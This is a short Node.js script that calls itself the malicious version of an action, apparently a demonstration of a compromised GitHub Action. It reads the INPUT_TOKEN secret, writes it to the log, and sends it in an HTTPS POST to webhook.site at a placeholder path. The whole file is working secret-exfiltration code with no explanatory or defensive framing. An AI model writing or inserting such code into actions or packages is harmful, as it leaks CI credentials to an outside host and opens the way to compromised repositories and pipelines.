console.log("☠️ This is the MALICIOUS version of the action.");
console.log("Leaking secret: " + process.env['INPUT_TOKEN']);

const https = require('https');
const data = JSON.stringify({ token: process.env['INPUT_TOKEN'] });

const req = https.request({
  hostname: 'webhook.site',
  path: '/your-unique-path',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length,
  },
}, res => {
  console.log(`Malicious exfil statusCode: ${res.statusCode}`);
});
req.write(data);
req.end();
